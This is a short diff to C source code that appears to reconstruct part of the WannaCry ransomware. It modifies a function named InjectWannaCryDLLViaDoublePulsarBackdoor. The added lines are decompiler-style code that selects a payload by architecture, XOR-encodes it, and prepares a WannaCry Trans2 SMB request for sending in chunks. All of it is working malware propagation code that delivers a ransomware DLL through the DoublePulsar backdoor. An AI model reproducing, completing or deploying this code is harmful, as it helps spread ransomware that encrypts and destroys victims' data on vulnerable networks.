@@ -23,8 +23,6 @@ int encodePacket(unsigned int xor_key, char *buf, int size)
 	return 0;
 }
 
-int iterations = TotalSizeOfPayload / 4096;
-int remainder = TotalSizeOfPayload % 4096;
 int v28;
 int v14;
 int v26;
@@ -66,6 +64,27 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, uns
 	else {
 		TotalSizeOfPayload = (int)&payload[sizeOfshellcode];
 	}
+	if ( architectureType )
+	    {
+	      v7 = &unk_42E758;
+	      dword_42ECE9 = (int)(v5 + 3440);
+	      *(int *)((char *)&dword_42E750 + v4) = (int)v5;
+	      *(int *)((char *)&dword_42E754 + v4) = 1;
+	      v8 = v4;
+	    }
+	    else
+	    {
+	      v7 = &unk_42FA60;
+	      dword_4302CE = (int)(v5 + 3978);
+	      *(int *)((char *)&dword_42FA58 + v4) = (int)v5;
+	      *(int *)((char *)&dword_42FA5C + v4) = 1;
+	      v8 = v4;
+	    }
+	    qmemcpy(v6, v7, v8);
+	    encodePacket(a3, (int)v6, v19);
+	    int iterations = TotalSizeOfPayload / 4096;
+	    int remainder = TotalSizeOfPayload % 4096;
+	    qmemcpy(&buf, &wannacry_Trans2_Request, 70);
 	
 	if ( TotalSizeOfPayload / 4096 > 0 )
 	    {
